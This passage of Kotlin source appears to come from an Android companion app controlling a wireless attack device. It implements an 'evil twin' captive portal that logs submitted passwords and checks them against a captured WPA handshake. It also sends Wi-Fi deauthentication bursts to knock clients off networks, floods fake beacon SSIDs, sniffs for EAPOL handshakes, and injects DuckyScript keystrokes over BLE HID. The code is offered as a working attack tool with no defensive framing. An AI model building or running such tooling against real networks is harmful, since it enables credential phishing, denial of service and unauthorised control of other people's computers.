                    "Firmware flash failed: ${t.message ?: t.javaClass.simpleName}",
                    level = LogLevel.ERROR,
                )
                addHistory("firmware", "Firmware flash failed", HistoryLevel.ERROR)
            } finally {
                _firmwareFlashing.value = false
                updateForegroundService()
            }
        }
    }

    private fun stopModulesForFlash() {
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        portalStatusJob?.cancel()
        portalStatusJob = null
        portalPcapJob?.cancel()
        portalPcapJob = null
        pcapJob?.cancel()
        pcapJob = null
        bleStatusJob?.cancel()
        bleStatusJob = null

        _beaconRunning.value = false
        _portalRunning.value = false
        _sniffing.value = false
        _deauthRunning.value = false
        _bleAdvertising.value = false
        _bleConnected.value = false
        _portalMode.value = null

        runCatching { pcapWriter?.close() }
        pcapWriter = null
        updateForegroundService()
    }

    fun setPortalHtmlFile(uri: Uri, name: String?) {
        _portalHtmlUri.value = uri
        _portalHtmlName.value = name ?: uri.lastPathSegment ?: "HTML file"
        appendLog("Portal HTML selected: ${_portalHtmlName.value}")
    }

    fun clearPortalHtmlFile() {
        _portalHtmlUri.value = null
        _portalHtmlName.value = null
        appendLog("Portal HTML cleared; device will use its placeholder page.")
    }

    fun startPortal(ssid: String, channel: Int, targetBssid: String) {
        startPortalInternal(ssid, channel, targetBssid, _portalHtmlUri.value, "portal")
    }

    fun startEvilTwin(ssid: String, channel: Int, targetBssid: String) {
        startPortalInternal(ssid, channel, targetBssid, _evilTwinHtmlUri.value, "evil_twin")
    }

    private fun startPortalInternal(
        ssid: String,
        channel: Int,
        targetBssid: String,
        htmlUri: Uri?,
        mode: String,
    ) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before starting the portal.")
            return
        }
        if (_portalRunning.value) return
        _portalMode.value = mode

        val cleanSsid = ssid.trim().ifBlank { "Free WiFi" }
        val cleanBssid = targetBssid.trim().uppercase()
        if (cleanBssid.isNotBlank() && !MAC_PATTERN.matches(cleanBssid)) {
            appendLog("Invalid target BSSID: $cleanBssid")
            return
        }

        // Firmware radioIdle() stops other radio tasks when the portal starts.
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        if (_sniffing.value) {
            _sniffing.value = false
            pcapJob?.cancel()
            pcapJob = null
            viewModelScope.launch(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
                pcapWriter = null
            }
        }

        _portalSsid.value = cleanSsid
        _portalChannel.value = channel.coerceIn(1, 13)
        _portalViews.value = 0
        _portalClients.value = 0
        _portalCapturedData.value = 0

        viewModelScope.launch {
            val args = JSONObject().apply {
                put("ssid", cleanSsid)
                put("channel", channel.coerceIn(1, 13))
                put("bssid", cleanBssid.ifBlank { "" })
            }
            appendLog("Starting captive portal '$cleanSsid' on channel ${channel.coerceIn(1, 13)}...")
            val response = activeSession.sendCommand("START_PORTAL", args, timeoutMs = 15_000)
            if (response?.optBoolean("ok") != true) {
                appendLog("Failed to start portal: ${response?.optString("msg") ?: "timeout"}")
                return@launch
            }

            _portalRunning.value = true
            updateForegroundService()
            _portalHtmlSize.value = 0
            _portalHandshake.value = EapolHandshake()
            _portalWpaHandshake.value = WpaHandshake()

            if (cleanBssid.isNotBlank()) {
                portalPcapJob?.cancel()
                val captureHandshake = EapolHandshake()
                val wpaHandshake = WpaHandshake()
                portalPcapJob = viewModelScope.launch(Dispatchers.IO) {
                    activeSession.pcap.collect { frame ->
                        EapolParser.parse(frame, captureHandshake)
                        _portalHandshake.value = captureHandshake.copy()
                        WpaHandshakeParser.parse(frame, wpaHandshake)
                        _portalWpaHandshake.value = wpaHandshake.copyHandshake()
                        verifyEvilTwinPasswords()
                    }
                }
            }
            _portalHtmlComplete.value = false

            if (htmlUri != null) {
                val bytes = withContext(Dispatchers.IO) {
                    runCatching {
                        getApplication<Application>().contentResolver
                            .openInputStream(htmlUri)
                            ?.use { it.readBytes() }
                    }.getOrNull()
                }
                if (bytes == null) {
                    appendLog("Could not read the selected HTML file.")
                } else if (bytes.isEmpty()) {
                    appendLog("Selected HTML file is empty; using device placeholder.")
                } else if (!uploadPortalHtml(activeSession, bytes)) {
                    appendLog("Portal HTML upload failed; device may be serving its placeholder page.")
                }
            }

            startPortalStatusPolling(activeSession)
            appendLog("Portal is running.")
            addHistory("portal", "Portal started: $cleanSsid", HistoryLevel.SUCCESS)
        }
    }

    private suspend fun uploadPortalHtml(session: NrSession, bytes: ByteArray): Boolean {
        val maxHtmlSize = 24 * 1024
        if (bytes.size > maxHtmlSize) {
            appendLog("HTML upload rejected: ${bytes.size} bytes exceeds firmware limit of $maxHtmlSize bytes.")
            return false
        }

        val supportsOffset = (_connectionState.value as? ConnectionState.Connected)
            ?.features
            ?.contains("portal_html_offset") == true
        appendLog(
            "Uploading HTML: ${bytes.size} bytes in " +
                "${(bytes.size + HTML_RAW_CHUNK_SIZE - 1) / HTML_RAW_CHUNK_SIZE} chunk(s) " +
                "(mode=${if (supportsOffset) "offset" else "legacy-append"})."
        )

        val reset = session.sendCommand(
            "RESET_HTML",
            JSONObject().put("size", bytes.size),
            timeoutMs = 10_000,
        )
        if (reset?.optBoolean("ok") != true) {
            appendLog("Device rejected RESET_HTML (size=${bytes.size}).")
            return false
        }

        delay(250)
        var offset = 0
        var chunkIndex = 0
        while (offset < bytes.size) {
            val end = minOf(offset + HTML_RAW_CHUNK_SIZE, bytes.size)
            val chunk = bytes.copyOfRange(offset, end)
            val encoded = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
            val isLast = end == bytes.size

            var success = false
            for (attempt in 1..3) {
                val args = JSONObject().apply {
                    put("data", encoded)
                    put("last", isLast)
                    if (supportsOffset) {
                        put("offset", offset)
                    }
                }
                val response = session.sendCommand("SET_HTML_CHUNK", args, timeoutMs = 5_000)
                if (response?.optBoolean("ok") == true) {
                    success = true
                    break
                }
                appendLog(
                    "HTML chunk $chunkIndex offset $offset attempt $attempt failed: " +
                        (response ?: "timeout")
                )
                delay(400)
            }
            if (!success) {
                appendLog("HTML upload aborted at chunk $chunkIndex (offset $offset).")
                return false
            }

            offset = end
            chunkIndex++
            _portalHtmlSize.value = offset
            if (isLast) appendLog("HTML final chunk sent (${bytes.size} bytes at offset $end).")
            delay(80)
        }

        delay(350)
        var status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000)
        var complete = status?.optBoolean("html_complete") == true
        if (!complete) {
            delay(500)
            status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000) ?: status
            complete = status?.optBoolean("html_complete") == true
        }

        val deviceSize = status?.optInt("html_size", 0) ?: 0
        val deviceExpected = status?.optInt("html_expected", bytes.size) ?: bytes.size
        if (!complete) {
            appendLog(
                "HTML upload did not complete on device " +
                    "(device reports size=$deviceSize, expected=$deviceExpected)."
            )
            return false
        }
        if (deviceSize < bytes.size) {
            appendLog("HTML size mismatch: sent ${bytes.size} bytes, device reports $deviceSize.")
            return false
        }
        if (deviceSize > bytes.size + HTML_TAIL_ALLOWANCE) {
            appendLog("HTML buffer looks corrupted: sent ${bytes.size} bytes, device reports $deviceSize.")
            return false
        }

        appendLog("HTML upload complete; device reports $deviceSize bytes (expected $deviceExpected).")
        _portalHtmlComplete.value = true
        return true
    }

    fun clearEvilTwinPasswords() {
        _evilTwinPasswords.value = emptyList()
        _evilTwinResults.value = emptyList()
    }

    private fun verifyEvilTwinPasswords() {
        val handshake = _portalWpaHandshake.value
        val ssid = _portalSsid.value
        val results = _evilTwinPasswords.value.map { password ->
            val status = when {
                !handshake.isComplete -> EvilTwinResult.Status.PENDING
                WpaHandshakeVerifier.verify(handshake, ssid, password) -> EvilTwinResult.Status.CORRECT
                else -> EvilTwinResult.Status.INCORRECT
            }
            EvilTwinResult(password, status)
        }
        _evilTwinResults.value = results
    }

    fun clearEvilTwinEventLog() {
        _evilTwinEventLog.value = emptyList()
    }

    fun clearPortalEventLog() {
        _portalEventLog.value = emptyList()
    }

    private fun portalLog(message: String) {
        val timestamp = java.time.LocalTime.now()
            .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
        val line = "[$timestamp] $message"
        if (_portalMode.value == "evil_twin") {
            _evilTwinEventLog.update { (it + line).takeLast(300) }
        } else {
            _portalEventLog.update { (it + line).takeLast(300) }
        }
    }

    fun stopPortal() {
        if (!_portalRunning.value) return
        portalStatusJob?.cancel()
        portalStatusJob = null
        portalPcapJob?.cancel()
        portalPcapJob = null
        _portalRunning.value = false
        _portalMode.value = null
        updateForegroundService()

        val activeSession = session
        viewModelScope.launch {
            val response = activeSession?.sendCommand("STOP_PORTAL", timeoutMs = 8_000)
            if (response?.optBoolean("ok") == true) {
                appendLog("Portal stopped.")
                addHistory("portal", "Portal stopped", HistoryLevel.SUCCESS)
            } else {
                appendLog("Portal stop request sent, but the device did not confirm.")
            }
        }
    }

    private fun startPortalStatusPolling(activeSession: NrSession) {
        portalStatusJob?.cancel()
        portalStatusJob = viewModelScope.launch {
            while (isActive && _portalRunning.value) {
                delay(3_000)
                val response = activeSession.sendCommand("PORTAL_STATUS", timeoutMs = 4_000) ?: continue
                if (response.optBoolean("ok")) {
                    _portalRunning.value = response.optBoolean("running", _portalRunning.value)
                    _portalHtmlSize.value = response.optInt("html_size", _portalHtmlSize.value)
                    _portalHtmlComplete.value = response.optBoolean("html_complete", _portalHtmlComplete.value)
                }
            }
        }
    }

    fun setBlePayload(uri: Uri, name: String?) {
        _blePayloadUri.value = uri
        _blePayloadName.value = name ?: uri.lastPathSegment ?: "payload.txt"
        appendLog("BLE payload selected: ${_blePayloadName.value}")
    }

    fun clearBlePayload() {
        _blePayloadUri.value = null
        _blePayloadName.value = null
        _bleSavedScriptText.value = null
        appendLog("BLE payload cleared.")
    }

    fun startBle(advertiseName: String) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before starting BLE HID.")
            return
        }
        if (_bleAdvertising.value) return

        viewModelScope.launch {
            val name = advertiseName.trim().ifBlank { "NRSuite Keyboard" }
            appendLog("Starting BLE HID advertising as '$name'...")
            val response = activeSession.sendCommand(
                "BLE_START",
                JSONObject().put("name", name),
                timeoutMs = 8_000,
            )
            if (response?.optBoolean("ok") == true) {
                _bleAdvertising.value = true
                _bleConnected.value = false
                _blePeer.value = ""
                startBleStatusPolling(activeSession)
                appendLog("BLE HID advertising started.")
                addHistory("ble", "BLE HID advertising started as '$name'", HistoryLevel.SUCCESS)
            } else {
                appendLog("Failed to start BLE HID: ${response?.optString("msg") ?: "timeout or unsupported"}")
            }
        }
    }

    fun stopBle() {
        if (!_bleAdvertising.value && !_bleConnected.value) return
        bleStatusJob?.cancel()
        bleStatusJob = null
        _bleAdvertising.value = false
        _bleConnected.value = false
        _blePeer.value = ""
        val activeSession = session
        viewModelScope.launch {
            runCatching { activeSession?.sendCommand("BLE_RELEASE_ALL", timeoutMs = 3_000) }
            val response = activeSession?.sendCommand("BLE_STOP", timeoutMs = 5_000)
            appendLog(
                if (response?.optBoolean("ok") == true) "BLE HID stopped."
                else "BLE stop request sent."
            )
        }
    }

    fun runBlePayload() {
        val activeSession = session
        val payloadUri = _blePayloadUri.value
        val savedScript = _bleSavedScriptText.value
        if (activeSession == null) {
            appendLog("Connect to a device before running a BLE payload.")
            return
        }
        if (payloadUri == null && savedScript == null) {
            appendLog("Choose a DuckyScript payload first.")
            return
        }
        viewModelScope.launch {
            val script = savedScript
                ?: withContext(Dispatchers.IO) {
                    runCatching {
                        payloadUri?.let {
                            getApplication<Application>().contentResolver
                                .openInputStream(it)
                                ?.use { stream -> stream.readBytes().toString(Charsets.UTF_8) }
                        }
                    }.getOrNull()
                }
            if (script.isNullOrBlank()) {
                appendLog("Could not read the selected BLE payload.")
                return@launch
            }
            runBleScript(activeSession, script)
        }
    }

    fun sendBleKeyboardText(text: String) {
        val activeSession = session ?: run {
            appendLog("Connect to a device before sending keyboard input.")
            return
        }
        if (text.isBlank()) return
        val script = if (text.startsWith("STRING", ignoreCase = true) ||
            text.startsWith("DELAY", ignoreCase = true) ||
            text.startsWith("CTRL", ignoreCase = true) ||
            text.startsWith("ALT", ignoreCase = true) ||
            text.startsWith("GUI", ignoreCase = true) ||
            text.startsWith("SHIFT", ignoreCase = true)
        ) {
            text
        } else {
            "STRINGLN $text"
        }
        viewModelScope.launch { runBleScript(activeSession, script) }
    }

    private suspend fun runBleScript(activeSession: NrSession, script: String) {
        if (!_bleConnected.value) {
            appendLog("BLE host is not connected yet.")
            return
        }
        val response = activeSession.sendCommand(
            "BLE_RUN_SCRIPT",
            JSONObject().put("script", script),
            timeoutMs = maxOf(10_000, script.length / 20L),
        )
        if (response?.optBoolean("ok") == true) {
            appendLog("BLE script finished (${response.optInt("lines")} lines).")
        } else {
            appendLog("BLE script failed: ${response?.optString("msg") ?: "timeout"}")
        }
    }

    private fun startBleStatusPolling(activeSession: NrSession) {
        bleStatusJob?.cancel()
        bleStatusJob = viewModelScope.launch {
            while (isActive && (_bleAdvertising.value || _bleConnected.value)) {
                delay(2_000)
                val response = activeSession.sendCommand("BLE_STATUS", timeoutMs = 4_000) ?: continue
                if (response.optBoolean("ok")) {
                    _bleAdvertising.value = response.optBoolean("advertising", _bleAdvertising.value)
                    _bleConnected.value = response.optBoolean("connected", _bleConnected.value)
                    _blePeer.value = response.optString("peer", "")
                }
            }
        }
    }

    fun startDeauth(
        bssid: String,
        channel: Int,
        client: String,
        count: Int,
        duration: Int,
        intervalMs: Int,
    ) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before sending deauth frames.")
            return
        }
        if (_deauthRunning.value) return
        stopLocalPortal()

        val cleanBssid = bssid.trim().uppercase()
        val cleanClient = client.trim().ifBlank { "FF:FF:FF:FF:FF:FF" }.uppercase()
        if (!MAC_PATTERN.matches(cleanBssid)) {
            appendLog("Invalid target BSSID: $cleanBssid")
            return
        }
        if (!MAC_PATTERN.matches(cleanClient)) {
            appendLog("Invalid client MAC: $cleanClient")
            return
        }

        // The firmware's DEAUTH handler calls radioIdle(), so stop local
        // companion tasks before issuing the burst.
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        if (_sniffing.value) {
            _sniffing.value = false
            pcapJob?.cancel()
            pcapJob = null
            viewModelScope.launch(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
                pcapWriter = null
            }
        }

        _deauthSent.value = 0
        _deauthTarget.value = cleanBssid
        _deauthChannel.value = channel.coerceIn(1, 13)
        _deauthRunning.value = true
        updateForegroundService()

        viewModelScope.launch {
            appendLog(
                "Starting deauth burst: $cleanBssid on channel $channel " +
                    "(client=$cleanClient, count=${if (count <= 0) "firmware default" else count})."
            )
            val args = JSONObject().apply {
                put("bssid", cleanBssid)
                put("client", cleanClient)
                put("channel", channel.coerceIn(1, 13))
                put("count", count.coerceAtLeast(0))
                put("duration", duration.coerceAtLeast(0))
                put("deauth_interval_ms", intervalMs.coerceIn(10, 10_000))
                put("reason", 7)
            }
            val response = activeSession.sendCommand("DEAUTH", args, timeoutMs = 60_000)
            _deauthRunning.value = false
            updateForegroundService()
            if (response?.optBoolean("ok") == true) {
                appendLog("Deauth burst completed.")
                addHistory("deauth", "Deauth burst completed on $cleanBssid", HistoryLevel.SUCCESS)
            } else {
                appendLog("Deauth request failed: ${response?.optString("msg") ?: "timeout"}")
            }
        }
    }

    fun startBeacon(
        ssids: List<String>,
        channel: Int,
        intervalMs: Int,
        hidden: Boolean,
        randomBssid: Boolean,
    ) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before starting beacon broadcast.")
            return
        }
        if (_beaconRunning.value) return
        stopLocalPortal()

        val cleanSsids = ssids.map { it.trim() }.filter { it.isNotEmpty() }.distinct()
        if (cleanSsids.isEmpty()) {
            appendLog("At least one SSID is required.")
            return
        }
        if (cleanSsids.size > 32) {
            appendLog("Firmware supports at most 32 SSIDs.")
            return
        }

        viewModelScope.launch {
            appendLog("Starting beacon broadcast (${cleanSsids.size} SSID(s), channel $channel)...")
            val args = JSONObject().apply {
                put("ssids", cleanSsids.joinToString("\n"))
                put("channel", channel.coerceIn(1, 13))
                put("interval_ms", intervalMs.coerceIn(10, 2000))
                put("hidden", hidden)
                put("random_bssid", randomBssid)
            }
            val response = activeSession.sendCommand("START_BEACON", args, timeoutMs = 10_000)
            if (response?.optBoolean("ok") == true) {
                _beaconRunning.value = true
                updateForegroundService()
                _beaconSent.value = 0
                _beaconSsidCount.value = response.optInt("ssids", cleanSsids.size)
                _beaconChannel.value = response.optInt("channel", channel)
                appendLog("Beacon broadcast started.")
                addHistory("beacon", "Beacon broadcast started (${cleanSsids.size} SSIDs)", HistoryLevel.SUCCESS)
                startBeaconStatusPolling(activeSession)
            } else {
                appendLog("Failed to start beacon broadcast: ${response?.optString("msg") ?: "timeout"}")
            }
        }
    }

    fun stopBeacon() {
        if (!_beaconRunning.value) return
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        updateForegroundService()

        val activeSession = session
        viewModelScope.launch {
            val response = activeSession?.sendCommand("STOP_BEACON", timeoutMs = 6_000)
            if (response?.optBoolean("ok") == true) {
                _beaconSent.value = response.optInt("sent", _beaconSent.value)
                _beaconSsidCount.value = response.optInt("ssids", _beaconSsidCount.value)
                appendLog("Beacon stopped. Frames sent: ${_beaconSent.value}.")
                addHistory("beacon", "Beacon stopped; ${_beaconSent.value} frames sent", HistoryLevel.SUCCESS)
            } else {
                appendLog("Beacon stop request sent, but the device did not confirm.")
            }
        }
    }

    private fun startBeaconStatusPolling(activeSession: NrSession) {
        beaconStatusJob?.cancel()
        beaconStatusJob = viewModelScope.launch {
            while (isActive && _beaconRunning.value) {
                delay(2_000)
                val response = activeSession.sendCommand("BEACON_STATUS", timeoutMs = 4_000) ?: continue
                if (response.optBoolean("ok")) {
                    _beaconRunning.value = response.optBoolean("active", _beaconRunning.value)
                    _beaconSent.value = response.optInt("sent", _beaconSent.value)
                    _beaconSsidCount.value = response.optInt("ssids", _beaconSsidCount.value)
                    _beaconChannel.value = response.optInt("channel", _beaconChannel.value)
                }
            }
        }
    }

    fun startSniff(request: SniffRequest) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before sniffing.")
            return
        }
        if (_sniffing.value) return
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        stopLocalPortal()

        val captureName = "capture_${System.currentTimeMillis()}.pcap"
        val exportUri = _exportDirectory.value
        if (exportUri == null) {
            _requiresRootDirectory.value = true
            appendLog("Choose an NRSuite root directory before starting a capture.")
            return
        }
        val writerResult = runCatching {
            val pcapDir = ensureChildDirectory(exportUri, "Pcap")
            val pcapDirUri = pcapDir?.uri ?: exportUri
            val documentUri = createPcapDocumentInDirectory(pcapDirUri, captureName)
            val outputStream = getApplication<Application>().contentResolver
                .openOutputStream(documentUri, "wt")
                ?: throw IOException("Could not open export file")
            val displayName = displayNameForTreeUri(exportUri)
            PcapWriter(outputStream, closeOutput = true) to "$displayName/Pcap/$captureName"
        }
        val (writer, captureDisplayPath) = writerResult.getOrElse { error ->
            appendLog("Could not create capture output: ${error.message}")
            return
        }

        pcapWriter = writer
        _capturePath.value = captureDisplayPath
        _sniffPacketCount.value = 0
        _sniffHandshake.value = EapolHandshake()
        _sniffing.value = true
        updateForegroundService()

        appendLog("Capture file: $captureDisplayPath")

        val eapolState = EapolHandshake()
        var eapolStopRequested = false
        pcapJob = viewModelScope.launch(Dispatchers.IO) {
            activeSession.pcap.collect { frame ->
                val matchesTarget = !request.targetNetworkOnly ||
                    frameMatchesBssid(frame, request.targetBssid)
                if (matchesTarget) {
                    try {
                        writer.writePacket(frame)
                        _sniffPacketCount.update { it + 1 }
                    } catch (t: Throwable) {
                        appendLog("PCAP write error: ${t.message}")
                    }
                }

                if (request.eapolOnly) {
                    EapolParser.parse(frame, eapolState)
                    _sniffHandshake.value = eapolState.copy()
                    val targetMatches = MAC_PATTERN.matches(request.targetBssid.trim().uppercase())
                    if (!eapolStopRequested && targetMatches && eapolState.isComplete) {
                        eapolStopRequested = true
                        appendLog("[+] Valid 4-Way Handshake captured!")
                        stopSniff()
                    }
                }
            }
        }

        viewModelScope.launch {
            if (request.deauthBeforeCapture) {
                val cleanBssid = request.targetBssid.trim().uppercase()
                if (MAC_PATTERN.matches(cleanBssid)) {
                    val cleanClient = request.client.trim()
                        .ifBlank { "FF:FF:FF:FF:FF:FF" }
                        .uppercase()
                    appendLog("Sending deauth burst before capture...")
                    val deauthResponse = activeSession.sendCommand(
                        "DEAUTH",
                        JSONObject().apply {
                            put("bssid", cleanBssid)
                            put("client", cleanClient)
                            put("channel", request.channel.coerceIn(1, 13))
                            put("count", request.deauthCount.coerceAtLeast(0))
                            put("deauth_interval_ms", request.deauthIntervalMs.coerceIn(10, 10_000))
                            put("reason", 7)
                        },
                        timeoutMs = 20_000,
                    )
                    if (deauthResponse?.optBoolean("ok") != true) {
                        appendLog("Deauth burst failed or timed out; continuing with capture.")
                    }
                } else {
                    appendLog("Skipping deauth trigger: invalid target BSSID.")
                }
            }

            val cleanFilterBssid = request.targetBssid.trim().uppercase()
            val args = JSONObject().apply {
                put("mode", if (request.fixedMode) "fixed" else "hop")
                put("channel", request.channel.coerceIn(1, 13))
                put("interval_ms", request.intervalMs.coerceIn(50, 2_000))
                if (request.eapolOnly) {
                    put("eapol_only", true)
                }
                if (MAC_PATTERN.matches(cleanFilterBssid)) {
                    put("bssid", cleanFilterBssid)
                }
            }
            val response = activeSession.sendCommand("START_SNIFF", args, timeoutMs = 12_000)
            if (response?.optBoolean("ok") == true) {
                val message = if (request.fixedMode) {
                    "Sniffing started on channel ${request.channel.coerceIn(1, 13)}."
                } else {
                    "Channel-hopping sniffing started."
                }
                appendLog(message)
                addHistory("sniff", message, HistoryLevel.SUCCESS)
            } else {
                appendLog("Failed to start sniffing: ${response?.optString("msg") ?: "timeout"}")
                stopSniff()
            }
        }
    }

    fun stopSniff() {
        if (!_sniffing.value) return
        _sniffing.value = false
        updateForegroundService()

        pcapJob?.cancel()
        pcapJob = null

        val activeSession = session
        viewModelScope.launch {
            val response = activeSession?.sendCommand("STOP_SNIFF", timeoutMs = 6_000)
            if (response != null) {
                appendLog(
                    "Capture stopped: captured=${response.optInt("captured")}, " +
                        "sent=${response.optInt("sent")}, dropped=${response.optInt("dropped")}"
                )
            }
            withContext(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
            }
            pcapWriter = null
            _capturePath.value?.let {
                appendLog("Capture saved: $it")
                addHistory("sniff", "Capture saved: $it", HistoryLevel.SUCCESS)
            }
        }
    }

    private fun updateForegroundService() {
        val context = getApplication<Application>()
        val activeText = when {
            _sniffing.value -> "Packet capture active"
            _beaconRunning.value -> "Beacon broadcast active"
            _portalRunning.value -> "Captive portal active"
            _deauthRunning.value -> "Deauth burst active"
            else -> null
        }
        val intent = Intent(context, NrSuiteForegroundService::class.java)
        if (activeText != null) {
            intent.action = NrSuiteForegroundService.ACTION_START
            intent.putExtra(NrSuiteForegroundService.EXTRA_TEXT, activeText)
            ContextCompat.startForegroundService(context, intent)
        } else {
            context.stopService(intent)
        }
    }

    private fun stopLocalPortal(sendStop: Boolean = true) {
        portalStatusJob?.cancel()
        portalStatusJob = null
        if (!_portalRunning.value) return
        _portalRunning.value = false
        if (sendStop) {
            val current = session
            if (current != null) {
                viewModelScope.launch {
                    runCatching { current.sendCommand("STOP_PORTAL", timeoutMs = 4_000) }
                }
            }
        }
    }

    fun disconnect() {
        val current = session
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        if (_beaconRunning.value) {
            _beaconRunning.value = false
            viewModelScope.launch {
                runCatching { current?.sendCommand("STOP_BEACON", timeoutMs = 4_000) }
            }
        }
        if (_sniffing.value) {
            _sniffing.value = false
            pcapJob?.cancel()
            pcapJob = null
            viewModelScope.launch(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
                pcapWriter = null
            }
        }
        portalStatusJob?.cancel()
        portalStatusJob = null
        session = null
        updateForegroundService()
        viewModelScope.launch {
            if (_portalRunning.value) {
                _portalRunning.value = false
                runCatching { current?.sendCommand("STOP_PORTAL", timeoutMs = 4_000) }
            }
            updateForegroundService()
            current?.disconnect()
            disconnectInternal()
        }
    }

    private fun observe(session: NrSession) {
        sessionObservers = listOf(
            viewModelScope.launch {
                session.state.collect { _connectionState.value = it }
            },
            viewModelScope.launch {
                session.logs.collect { appendLog(it) }
            },
            viewModelScope.launch {
                session.events.collect { event ->
                    _events.update { (it + event).takeLast(100) }
                    when (event.optString("type")) {
                        "scan_ap" -> {
                            _networks.update { current ->
                                val bssid = event.optString("bssid")
                                (current.filterNot { it.optString("bssid") == bssid } + event)
                                    .sortedByDescending { it.optInt("rssi", -999) }
                            }
                            val ssid = event.optString("ssid").ifBlank { "(hidden)" }
                            appendLog(
                                "AP: $ssid  ${event.optString("bssid")}  " +
                                    "ch ${event.optInt("channel")}  ${event.optInt("rssi")} dBm  " +
                                    event.optString("security")
                            )
                        }
                        "portal_viewed" -> {
                            _portalViews.update { it + 1 }
                            val ip = event.optString("client_ip", "unknown")
                            appendLog("Portal viewed from $ip.")
                            portalLog("GET / from $ip")
                        }
                        "captive_data" -> {
                            _portalCapturedData.update { it + 1 }
                            val ip = event.optString("ip", "unknown")
                            val userAgent = event.optString("user_agent", "")
                            val data = event.optJSONObject("data")
                            val fields = data?.keys()?.asSequence()?.joinToString(", ") { key ->
                                "$key=${data.optString(key)}"
                            } ?: ""
                            appendLog("Captive data received from $ip.")
                            portalLog("POST /login from $ip | UA: $userAgent | data: $fields")
                            val submittedPassword = data?.optString("password").orEmpty().ifBlank {
                                data?.optString("pass").orEmpty()
                            }
                            if (submittedPassword.isNotBlank() && _portalMode.value == "evil_twin") {
                                _evilTwinPasswords.update { (it + submittedPassword).takeLast(50) }
                                verifyEvilTwinPasswords()
                            }
                        }
                        "client_associated" -> {
                            _portalClients.update { it + 1 }
                            val client = event.optString("client")
                            val rssi = event.optInt("rssi")
                            appendLog("Client associated: $client ($rssi dBm).")
                            portalLog("Client associated: $client ($rssi dBm)")
                        }
                        "deauth_stats" -> {
                            _deauthSent.value = event.optInt("sent_frames", _deauthSent.value)
                            appendLog("Deauth stats: ${_deauthSent.value} frame(s) sent.")
                            portalLog("Deauth stats: ${_deauthSent.value} frame(s) sent")
                        }
                        "heartbeat" -> Unit
                    }
                }
            },
        )
    }

    private fun disconnectInternal() {
        sessionObservers.forEach { it.cancel() }
        sessionObservers = emptyList()
        session?.let { activeSession ->
            viewModelScope.launch { activeSession.disconnect() }
        }
        session = null
        activeDeviceFingerprint = null
        _connectionState.value = ConnectionState.Disconnected
    }

    private fun ensureRootStructure(rootUri: Uri) {
        viewModelScope.launch(Dispatchers.IO) {
            val root = DocumentFile.fromTreeUri(getApplication(), rootUri)
            if (root == null) {
                appendLog("Could not open the selected NRSuite root directory.")
                return@launch
            }

            val expectedDirectories = listOf("Pcap", "DuckyEditor", "Logs", "Portals")
            val readyDirectories = mutableListOf<String>()
            for (name in expectedDirectories) {
                val existing = root.findFile(name)
                if (existing != null) {
                    readyDirectories += name
                } else if (root.createDirectory(name) != null) {
                    readyDirectories += name
                } else {
                    appendLog("Could not create NRSuite/$name in the selected root.")
                }
            }

            if (readyDirectories.isNotEmpty()) {
                appendLog("NRSuite root ready: ${readyDirectories.joinToString(", ")}.")
            }
        }
    }

    private fun ensureChildDirectory(rootUri: Uri, name: String): DocumentFile? {
        val root = DocumentFile.fromTreeUri(getApplication(), rootUri) ?: return null
        return root.findFile(name) ?: root.createDirectory(name)
    }

    private fun createPcapDocumentInDirectory(directoryUri: Uri, displayName: String): Uri {
        return DocumentsContract.createDocument(
            getApplication<Application>().contentResolver,
            directoryUri,
            "application/vnd.tcpdump.pcap",
            displayName,
        ) ?: throw IOException("Storage provider did not create a document")
    }

    private fun createPcapDocument(treeUri: Uri, displayName: String): Uri {
        val resolver = getApplication<Application>().contentResolver
        val parentDocumentId = DocumentsContract.getTreeDocumentId(treeUri)
        val parentUri = DocumentsContract.buildDocumentUriUsingTree(treeUri, parentDocumentId)
        return DocumentsContract.createDocument(
            resolver,
            parentUri,
            "application/vnd.tcpdump.pcap",
            displayName,
        ) ?: throw IOException("Storage provider did not create a document")
    }

    private fun displayNameForTreeUri(uri: Uri): String {
        val documentId = runCatching { DocumentsContract.getTreeDocumentId(uri) }.getOrNull()
        val fromDocumentId = documentId
            ?.substringAfterLast('/')
            ?.substringAfterLast(':')
            ?.trim()
        if (!fromDocumentId.isNullOrBlank()) {
            return fromDocumentId
        }
        return uri.lastPathSegment?.substringAfterLast(':')?.substringAfterLast('/')?.trim()
            ?.takeIf { it.isNotBlank() }
            ?: "Selected folder"
    }

    private fun frameMatchesBssid(frame: ByteArray, bssid: String): Boolean {
        val parts = bssid.trim().uppercase().split(":")
        if (parts.size != 6) return false
        val target = ByteArray(6) { index ->
            parts[index].toIntOrNull(16)?.toByte() ?: return false
        }
        if (frame.size < 8) return false
        val radiotapLength = (frame[2].toInt() and 0xFF) or
            ((frame[3].toInt() and 0xFF) shl 8)
        val macBase = radiotapLength
        if (frame.size < macBase + 22) return false
        for (offset in intArrayOf(4, 10, 16)) {
            var matches = true
            for (i in 0 until 6) {
                if (frame[macBase + offset + i] != target[i]) {
                    matches = false
                    break
                }
            }
            if (matches) return true
        }
        return false
    }

    private fun appendLog(
        message: String,
        level: LogLevel = LogLevel.INFO,
        tag: String = "app",
    ) {
        val entry = LogEntry(
            timestamp = java.time.LocalTime.now()
                .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss")),
            level = level,
            tag = tag,
            message = message,
        )
        _logs.update { (it + entry).takeLast(300) }
    }

    companion object {
        private const val PREFERENCES_NAME = "nrsuite"
